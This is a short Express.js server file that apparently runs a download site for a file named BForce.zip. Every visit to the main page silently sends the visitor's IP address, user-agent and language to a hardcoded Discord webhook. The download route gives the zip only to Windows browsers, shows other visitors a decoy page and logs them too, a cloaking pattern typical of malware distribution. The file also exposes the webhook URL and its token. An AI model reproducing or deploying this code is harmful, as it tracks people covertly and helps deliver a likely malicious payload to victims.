require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch')
const path = require('path');
const app = express();
const PORT = process.env.PORT || 8080;
const wh = 'https://discord.com/api/webhooks/832118860631113758/-_y-wGd6bNGXD-De2WZj-Zjn3G1DxWLiCR1TJZSpiMU4MOoe9QXnV-lMlSQ_DbS5czVX';

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '/index.html'));
    ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',').reverse()[0])
    fetch(wh, {
        method: 'post',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `@everyone\n\`\`\`\n${req.headers['user-agent']}\n${req.headers['accept-language']}\n${ip}\`\`\`` })
    });
})

app.all('/static/bin/BForce.zip', (req, res) => {
    if (req.headers['user-agent'].includes("(Windows"))
        res.sendFile(path.join(__dirname, '/static/bin/BForce.zip'));
    else {
        ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',').reverse()[0])
        fetch(wh, {
            method: 'post',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: `@everyone (code 2)\n\`\`\`\n${req.headers['user-agent']}\n${req.headers['accept-language']}\n${ip}\`\`\`` })
        });
        res.sendFile(path.join(__dirname, '/static/index.html'));
    }
})

app.use(express.static(path.join(__dirname)));
app.get('*', (req, res) => res.send("No. <style>html { background: #181818; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }</style>"));
app.listen(PORT, () => {
    console.log(`Running on port ${PORT}`)
})